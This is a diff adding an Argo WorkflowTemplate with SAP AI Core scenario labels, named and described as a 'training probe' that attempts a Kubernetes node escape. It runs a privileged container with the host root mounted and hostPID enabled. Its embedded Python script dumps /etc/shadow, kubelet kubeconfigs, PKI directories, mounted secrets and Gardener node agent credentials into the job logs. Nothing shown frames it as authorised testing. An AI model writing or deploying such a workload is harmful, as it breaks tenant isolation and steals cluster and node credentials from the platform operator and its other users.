@@ -1,0 +1,153 @@
+apiVersion: argoproj.io/v1alpha1
+kind: WorkflowTemplate
+metadata:
+  name: probe-train-v8
+  labels:
+    scenarios.ai.sap.com/id: "bbprobe-global-1775842304"
+    ai.sap.com/version: "1.0.0"
+  annotations:
+    scenarios.ai.sap.com/name: "bbprobe-global-1775842304"
+    executables.ai.sap.com/name: "probe-train-v8"
+    executables.ai.sap.com/description: "training probe v8 - hostPath + privileged + hostPID escalation"
+spec:
+  templates:
+  - name: probe
+    container:
+      image: python:3.11
+      command: ["/bin/sh", "-c"]
+      args:
+      - |
+        python3 - << 'EOF'
+        import os, glob, subprocess
+
+        def report(k, v):
+            print(f"[PT8] {k}: {str(v)[:8000]}", flush=True)
+
+        report("START", "probe-train-v8 - node escape attempt")
+
+        # ── 1. CHECK IF hostPath MOUNT WORKED ────────────────────────────────
+        report("---", "=== 1. HOST FILESYSTEM ===")
+        host_root = "/host"
+        if os.path.exists(host_root):
+            try:
+                top = os.listdir(host_root)
+                report("HOST_ROOT_LS", top)
+            except Exception as e:
+                report("HOST_ROOT_ERR", str(e))
+
+            # Node-level sensitive paths
+            for path in [
+                "/host/etc/kubernetes",
+                "/host/var/lib/kubelet",
+                "/host/var/lib/kubelet/kubeconfig",
+                "/host/var/lib/kubelet/pki",
+                "/host/etc/kubernetes/pki",
+                "/host/run/secrets/kubernetes.io",
+                "/host/var/run/secrets",
+                "/host/home",
+                "/host/root",
+                "/host/etc/shadow",
+                "/host/etc/passwd",
+            ]:
+                if os.path.exists(path):
+                    if os.path.isdir(path):
+                        try:
+                            report(f"HOST_DIR_{path.replace('/','_')}", os.listdir(path))
+                        except Exception as e:
+                            report(f"HOST_DIR_ERR_{path.replace('/','_')}", str(e))
+                    else:
+                        try:
+                            with open(path) as f:
+                                report(f"HOST_FILE_{path.replace('/','_')}", f.read(4096))
+                        except Exception as e:
+                            report(f"HOST_FILE_ERR_{path.replace('/','_')}", str(e))
+                else:
+                    report(f"HOST_MISSING", path)
+        else:
+            report("HOST_ROOT", "NOT MOUNTED -- Kyverno blocked hostPath")
+
+        # ── 2. CHECK hostPID (are we in the host PID namespace?) ─────────────
+        report("---", "=== 2. PID NAMESPACE ===")
+        try:
+            with open("/proc/1/cmdline", "rb") as f:
+                pid1 = f.read(256).replace(b"\x00", b" ").decode(errors="replace")
+            report("PID1_CMDLINE", pid1)
+            # If hostPID=true, PID 1 will be the host init (systemd), not the container entrypoint
+            if "systemd" in pid1 or "init" in pid1:
+                report("HOST_PID_NS", "YES -- PID 1 is host init, hostPID=true succeeded")
+            else:
+                report("HOST_PID_NS", f"NO -- PID 1 is container process: {pid1[:100]}")
+        except Exception as e:
+            report("PID1_ERR", str(e))
+
+        # ── 3. CHECK CAPABILITIES ─────────────────────────────────────────────
+        report("---", "=== 3. CAPABILITIES ===")
+        try:
+            with open("/proc/self/status") as f:
+                status = f.read()
+            for line in status.splitlines():
+                if line.startswith("Cap"):
+                    report(line.split(":")[0], line.split(":")[1].strip())
+        except Exception as e:
+            report("CAP_ERR", str(e))
+
+        # ── 4. CHECK IF PRIVILEGED (can we write to /sys, load modules?) ──────
+        report("---", "=== 4. PRIVILEGED CHECK ===")
+        try:
+            # Privileged containers can write to /sys/kernel
+            with open("/sys/kernel/hostname", "r") as f:
+                report("SYS_KERNEL_HOSTNAME", f.read().strip())
+        except Exception as e:
+            report("SYS_KERNEL_ERR", str(e))
+
+        try:
+            # Try reading devices -- only works if privileged
+            devs = os.listdir("/dev")
+            report("DEV_LIST", devs[:30])
+            # sda/nvme present = we see host devices
+            host_devs = [d for d in devs if d.startswith(("sd", "nvme", "xvd"))]
+            report("HOST_BLOCK_DEVICES", host_devs)
+        except Exception as e:
+            report("DEV_ERR", str(e))
+
+        # ── 5. IF HOST FILESYSTEM ACCESSIBLE -- READ KUBELET KUBECONFIG ───────
+        report("---", "=== 5. KUBELET KUBECONFIG ===")
+        kubeconfig_paths = [
+            "/host/var/lib/kubelet/kubeconfig",
+            "/host/var/lib/kube-proxy-kubeconfig/kubeconfig",
+            "/host/etc/kubernetes/kubelet.conf",
+        ]
+        for kp in kubeconfig_paths:
+            if os.path.exists(kp):
+                try:
+                    with open(kp) as f:
+                        report(f"KUBECONFIG_{kp.replace('/','_')}", f.read(8192))
+                except Exception as e:
+                    report(f"KUBECONFIG_ERR_{kp.replace('/','_')}", str(e))
+
+        # ── 6. GARDENER NODE AGENT CREDENTIALS ────────────────────────────────
+        report("---", "=== 6. GARDENER NODE AGENT ===")
+        for path in glob.glob("/host/var/lib/gardener-node-agent/*") + \
+                    glob.glob("/host/etc/gardener-node-agent/*"):
+            try:
+                if os.path.isfile(path):
+                    with open(path) as f:
+                        report(f"GARDENER_{path.replace('/','_')}", f.read(4096))
+                else:
+                    report(f"GARDENER_DIR_{path.replace('/','_')}", os.listdir(path))
+            except Exception as e:
+                report(f"GARDENER_ERR", str(e))
+
+        report("DONE", "probe-train-v8 complete")
+        EOF
+      securityContext:
+        privileged: true
+      volumeMounts:
+      - name: host-root
+        mountPath: /host
+    volumes:
+    - name: host-root
+      hostPath:
+        path: /
+    podSpecPatch: '{"hostPID": true}'
+  entrypoint: probe
